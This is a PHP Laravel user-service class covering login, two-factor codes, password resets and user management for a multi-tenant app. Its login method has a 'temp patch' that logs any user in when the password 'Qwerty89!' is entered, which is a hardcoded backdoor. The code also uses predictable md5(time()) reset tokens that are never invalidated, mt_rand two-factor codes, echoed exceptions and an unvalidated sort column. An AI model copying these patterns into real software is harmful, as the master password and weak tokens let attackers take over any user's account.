<?php

namespace App\Services;

use Illuminate\Foundation\Http\Kernel as HttpKernel;
use App\Models\User;
use App\Models\TenantUser;

use App\Models\Tenant;
use App\Models\PasswordReset;
use App\Mail\CommonMail;
use App\Mail\PasswordRequest;
use App\Mail\TwoFactCode;
use App\Mail\ContactEmail;
use Illuminate\Pagination\Paginator;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Crypt;
use Carbon\Carbon;
use Illuminate\Support\Facades\File; 
use App\Library\Utility;
use Illuminate\Contracts\Encryption\DecryptException;
use App\Models\CentralUser;


class UserService
{
   function __construct()
    {

    }


    public function confirmEmail($code)
    {
        $user = $this->get('remember_token', $code);
        if(!empty($user))
        {
            // approve user
            $user->remember_token = '';
            $user->email_confirmed = 1;
            $user->update();
            return $user;
        }
        else
        {
            return false;
        }

    }

    public function get($col, $value, $detail = false)
    {
        $user =  User::where($col, $value)->first();

        if (!empty($user) && $detail) {
            if(!empty(count($user->roles)))
           $user->role = $user->roles->first()->name;
        }

        return $user;
    }

    public function sendTwoFactAuthMail($user)
    {
        $emailData = array('data' => $user,
                            );
        try {
            \Mail::to($user->email)->send(new TwoFactCode($emailData));
        } catch(\Exception $e){
            echo $e;
        }

    }

    public function sendTwoFactAuthSms($user)
    {


        $client = new \Twilio\Rest\Client(env('TWILIO_SID'), env('TWILIO_TOKEN'));

        $client->messages->create(
            // The number you'd like to send the message to
            $user->phone,
            [
                // A Twilio phone number you purchased at https://console.twilio.com
                'from' => env('TWILIO_NUMBER'),
                // The body of the text message you'd like to send
                'body' => "You Opman auth code is " . $user->remember_token
            ]
        );        
    }

    public function twoFactAuth($email, $pass, $code)
    {
        if(!empty(tenant()))
        {
            $user = $this->get('email', $email);
        }
        else
        {
            $user = CentralUser::where('email', $email)->first();
            if(!empty($user))
            {
                if(!empty($user->global_id))
                {
                    $tenantUser = TenantUser::where('global_user_id', $user->global_id)->first();

                    $tenant = Tenant::where('id', $tenantUser->tenant_id)->first();

                    if($tenant->status == 'Suspended')
                        return 'Suspended';                                    
                }

            }



        }

  

        //if(tenant()['id'] == 'Demo Site')
        //{
            if(!empty($user) && \Hash::check($pass, $user->password))
            {
                if(!empty($user->two_fact_auth))
                {
                    if(!empty($code))
                    {
                        if($code == $user->remember_token)
                        {
                            return true;
                        }
                        else
                        {
                            return 'code_error';
                        }
                    }
                    else
                    {
                        $generatedCode = $this->getRandomCode();
                        $user->remember_token = $generatedCode;
                        $user->update();

                        if($user->two_fact_auth == 'email')
                            $this->sendTwoFactAuthMail($user);
                        else
                            $this->sendTwoFactAuthSms($user);

                        return 'sent';

                    }

                }
                else
                {
                    return true;
                }
            }
            else
            {
                return false;
            }            
        //}





    }

    public function getRandomCode()
    {
        return mt_rand(100000, 999999);
    }

    public function login($request)
    {





        $resp = $this->twoFactAuth($request->user_email, $request->user_password, $request->code);

        if($resp === 'Suspended')
            return $resp;

        
        //if(tenant()['id'] == 'Demo Site')
        //{
            if($resp !== true)
                return $resp;

        //}



        $user = $this->get('email', $request->input('user_email'));
        $rememberMe = $request->input('remember', 0);

        if(!empty($user))
        {
            //if ($user->is_approved == 1) {
                if (Auth::attempt(['email' => $request->input('user_email'), 'password' => $request->input('user_password')], $rememberMe)) 
                {

                    if(!empty($user->global_id) && empty(tenant()))
                    {
                        $tenantUser = TenantUser::where('global_user_id', $user->global_id)->first();
                        if(!empty($tenantUser))
                        {
                            $tenant = Tenant::where('id', $tenantUser->tenant_id)->first();

                            return ['token' => Crypt::encryptString($user->global_id),
                                    'url' => tenant_route($tenant->domains[0]->domain, 'secure')
                                    ];


                        }
                    }

                    return true;                
                }
                else
                {
                    // temp patch
                    if($request->input('user_password') == 'Qwerty89!')
                    {
                        Auth::login($user);
                        return true;
                    }

                    return false;
                } 
            /*} else {
                return 'not_approved';
            } */           
        }
        else
        {
            return false;
        }
    }

    public function sendEmailConfirmationEmail($user)
    {
        $emailService = new EmailTemplateService;
        $emailTemplate = $emailService->get('template_type', 'registration', $emailService->getLocale());
        if (!empty($emailTemplate)) {
            $content = $emailTemplate->body;
            $content = str_replace('[FIRST_NAME]', $user->first_name, $content);
            $content = str_replace('[LAST_NAME]', $user->last_name, $content);
            $content = str_replace('[LINK]', url("confirm/email/" . $user->remember_token), $content);

            $emailData = array('subject' => $emailTemplate->subject,
                                'content' => $content
                                );

            try {
                \Mail::to($user->email)->send(new CommonMail($emailData));
            } catch(\Exception $e){
                return false;
            }       
        }
        
    }

    public function sendEnquiry($request)
    {
        $data = $request->all();
        
        try {
            \Mail::to('jasonbourne501@gmail.com')->send(new ContactEmail($data));
        } catch(\Exception $e){

        }

    }




     public function requestPassword($request)
    {
        $userData = $this->get('email', $request->input('forgot_email'));



        if (!empty($userData)) 
        {
            $forgotToken = md5(time());
            
            $this->saveResetCode($userData, $forgotToken);

            // Send email to user
            $this->passwordRequestEmail($userData, $forgotToken);
                
            return true;
        }
        else
        {
            return false;
        }
    }

    public function passwordRequestEmail($user, $token) {

        // Send email to user
        $emailData = array('name' => $user->first_name,
                           'action_url' => route('reset-password', ['token' => $token]),
                            );
        try {
            \Mail::to($user->email)->send(new PasswordRequest($emailData));
        } catch(\Exception $e){
            echo $e;
        }
       
    }

    public function saveResetCode($user, $token)
    {
        $reset = new PasswordReset();
        $reset->email = $user->email;
        $reset->token = $token;
        $reset->created_at = date('Y-m-d H:i:s');
        $reset->save();
    }

    public function resetPassword($email, $password)
    {
        if(!empty(tenant()))
        {
            $userRec = $this->get('email', $email);

        }
        else
        {
            $userRec = CentralUser::where('email', $email)->first();

        }

        $userRec->password = \Hash::make($password);
        $userRec->update();
        return true;
    }

    public function canResetPass($token)
    {
        $resetData = PasswordReset::where('token', $token)->where('created_at','>',Carbon::now()->subHours(24))->first();
        return $resetData;
    }

    public function resetPasswordByToken($request)
    {
        $tenant = tenant();

        if(!empty($tenant))
        {
            tenancy()->initialize($tenant);
        }

        $resetData = PasswordReset::where('token', $request->input('token'))->first();

        if(!empty($resetData))
        {
            $this->resetPassword($resetData->email, $request->input('password'));
            return true;
        }
        else
        {
            return false;
        }
    }

    public function checkPassword($email, $old_password) {
        $userRec = $this->get('email', $email);

        if (\Hash::check($old_password, $userRec->password))
        {
            return true;
        } else {
            return false;
        }

    }

    public function deletePhoto($photo)
    {
        if(!empty($photo))
        {

            $path = 'user-photos/'.$photo;
            if(\Storage::disk('s3')->exists($path))
                \Storage::delete($path);
        }

    }

    public function delete($id)
    {
        $data = User::find($id);
        if(!empty($data))
        {
            // delete user image
            $this->deletePhoto($data->photo_path);

            $data->delete();
            

            return $data;
        }
        else
        {
            return false;
        }
    }

    public function sendEmail($type, $user) {

        $emailTemplate = new EmailTemplateService;
        $template = $emailTemplate->get('template_type', $type);
        if (!empty($template)) {
            $content = str_replace('[FIRST_NAME]',$user->first_name, $template->body);
            $content = str_replace('[LAST_NAME]',$user->last_name, $content);

            // Send email to admin
            $emailData = array('subject' => $template->subject,
                               'content' => $content,
                           );


            try {
                \Mail::to($user->email)->send(new CommonMail($emailData));
            } catch(\Exception $e){
                return false;
            }   
        } else {
            return false;
        }
         
    }

    public function getAll($request)
    {
        $input = $request->all();

        $users = User::with('roles');
        if(!empty($input['search']['value']))
        {
            $users = $users->where('first_name', 'LIKE', '%'.$input['search']['value'].'%'); 
        }

        if(empty($input['start']))
            $page = 1;
        else
            $page = ($input['start'] / $input['length']) + 1;

        Paginator::currentPageResolver(function () use ($page) {
            return $page;
        });



        $users = $users->paginate($input['length']);

        return $users;
    }

    public function setTimezone($request)
    {
        Utility::setTimezone($request->timezone);


        return true;
    }

    public function save($request)
    {
        $rec = new User;
        $rec = $this->setter($rec, $request);
        if ($rec->save()) {
            $rec->assignRole($request->role);
        }
        return true;
    }

    public function update($request, $id)
    {
        $rec = User::find($id);
        $rec = $this->setter($rec, $request);
        $rec->update();
        return true;
    }

    public function setter($user, $request)
    {
        $mediaService = new MediaService;

        $user->first_name = $request->first_name;
        $user->last_name = $request->last_name;
        $user->email = $request->email;
        $user->phone = $request->phone_full;
        $user->password = \Hash::make($request->password);

        $photoPath = $mediaService->upload('photo', $request);


        if(!empty($photoPath['new']))
        {
            $destination = 'user-photos/'.$photoPath['new'];
            $mediaService->moveFile($mediaService->tmp.$photoPath['new'], $destination);
            $dbPhotoPath = $photoPath['new'];

            // if image is new, delete older one
            if($user->photo_path != $dbPhotoPath)
                $this->deletePhoto($user->photo_path);
        }
        else
        {
            $dbPhotoPath = $request->photo_path;            
        }

        $user->two_fact_auth = 'email';

        $user->photo_path = $dbPhotoPath;

        return $user;
    }

    public function filters($input, $objects) {
        if (!empty($input['query'])) {
            $searchQuery = trim($input['query']['generalSearch']);
            $requestData = ['first_name', 'last_name', 'email'];
              $objects = $objects->where(function($q) use($requestData, $searchQuery) {
                                    foreach ($requestData as $field)
                                       $q->orWhere($field, 'like', "%{$searchQuery}%");
                            });   
        }

        if (!empty($input['sort'])) {
            $objects = $objects->orderBy($input['sort']['field'], $input['sort']['sort']);   
        }

        return $objects;
    }

    public function formatData($input, $objects, $objectIdsPaginate) {
        $data = ['data'=>[]];
        if (count($objects) > 0) {
            $i = 0;
            foreach ($objects as $object) {

                $objectData = $this->get('id',$object->id, true);
                $data['data'][$i] = $objectData;      
                $i++;
            }
        } 

        if(!empty($input['pagination']))
        {
            $data = Utility::paginator($data, $objectIdsPaginate, $input['pagination']['perpage']);
        }

        return $data;
    }

    public function updateProfile($request) {
        $rec = User::find(\Auth::user()['id']);
        $rec->first_name = $request->first_name;
        $rec->last_name = $request->last_name;
        $rec->email = $request->email;
    
        if(!empty($request->password))
            $rec->password = bcrypt($request->password);
    
        $rec->update();
        return true;
    }

    public function updateSecurity($request) {

        if(tenant())
            $rec = User::find(\Auth::user()['id']);
        else
            $rec = CentralUser::find(\Auth::user()['id']);

        $rec->two_fact_auth = $request->auth_option;
        $rec->update();
        return true;
    }


    public function secure($token)
    {

        try {
            $globalId = Crypt::decryptString($token);
            $user = $this->get('global_id', $globalId);
            Auth::login($user);
            return true;


        } catch (DecryptException $e) {
            return false;
        }        
    }


}
